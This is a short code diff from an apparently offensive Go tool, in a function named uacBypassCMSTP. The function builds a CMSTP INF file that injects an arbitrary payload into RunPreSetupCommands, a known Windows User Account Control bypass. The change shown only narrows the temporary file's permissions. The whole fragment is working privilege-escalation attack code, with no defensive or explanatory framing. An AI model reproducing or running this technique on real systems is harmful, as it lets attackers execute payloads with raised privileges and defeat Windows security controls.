@@ -169,7 +169,7 @@ func uacBypassCMSTP(payload string) (string, error) {
 	infPath := filepath.Join(tmpDir, "forgeuac.inf")
 
 	infContent := []byte("[version]\r\nSignature=$chicago$\r\nAdvancedINF=2.5\r\n\r\n[DefaultInstall]\r\nRunPreSetupCommands=" + payload + "\r\n")
-	if err := os.WriteFile(infPath, infContent, 0644); err != nil {
+	if err := os.WriteFile(infPath, infContent, 0600); err != nil {
 		return "", fmt.Errorf("cmstp: write inf failed: %v", err)
 	}
 	defer os.Remove(infPath)
